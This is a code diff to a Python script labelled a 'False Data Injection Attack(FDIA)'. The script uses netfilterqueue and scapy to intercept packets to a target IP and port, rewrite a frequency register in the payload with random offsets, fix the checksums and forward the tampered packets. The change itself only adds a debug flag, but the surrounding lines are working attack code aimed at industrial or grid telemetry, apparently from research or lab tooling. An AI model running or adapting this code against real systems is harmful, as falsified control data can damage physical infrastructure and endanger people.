@@ -3,6 +3,7 @@ from netfilterqueue import NetfilterQueue
 import random
 
 change_values = []
+debugging = False
 
 def get_values():
     global change_values
@@ -13,6 +14,7 @@ def get_values():
 
 def modify_packet(scapy_packet):
     global change_values
+    global debugging
     try:
         packet = IP(scapy_packet.get_payload())
         if packet.haslayer(Raw):
@@ -22,12 +24,15 @@ def modify_packet(scapy_packet):
             first_register = int.from_bytes(data[0:2], byteorder="big")
             if first_register == 101 and len(payload) > 100:
                 hz_register = int.from_bytes(data[32:34], byteorder="big")
-                print("Orginal Frequency:", hz_register)
-                if len(change_values) == 0: get_values()
-                change_value=change_values.pop(0)
                 
                 #debug
-                print("Change Value:", change_value)
+                if debugging: print("Orginal Frequency:", hz_register)
+                
+                if len(change_values) == 0: get_values()
+                change_value=change_values.pop(0)
+                          
+                #debug        
+                if debugging: print("Change Value:", change_value)
                 
                 new_sec_register = hz_register + change_value
                 if new_sec_register < 0:
@@ -43,12 +48,14 @@ def modify_packet(scapy_packet):
                 del packet[IP].chksum
                 if packet.haslayer(TCP):
                     del packet[TCP].chksum
-
-                print("Modified Frequecy:", new_sec_register)
+                
+                #debug  
+                if debugging: print("Modified Frequecy:", new_sec_register)
+ 
 
                 scapy_packet.set_payload(bytes(packet))
-
-                print("Modified and sent packet")
+                #debug
+                if debugging: print("Modified and sent packet")
 
 
         scapy_packet.accept()
@@ -71,11 +78,14 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='False Data Injection Attack(FDIA)')
     parser.add_argument('target', help='IP of target')
     parser.add_argument('-p', '--port', default='30502',
-                       help='Port of target')   
+                       help='Port of target')
+    parser.add_argument('-d', '--debug', default=False, action='store_true',
+                       help='Debug mode')
     args = parser.parse_args()
     
     ip = args.target
     port=args.port
+    debugging = args.debug
 
     try:
         setup_iptables(ip,port)
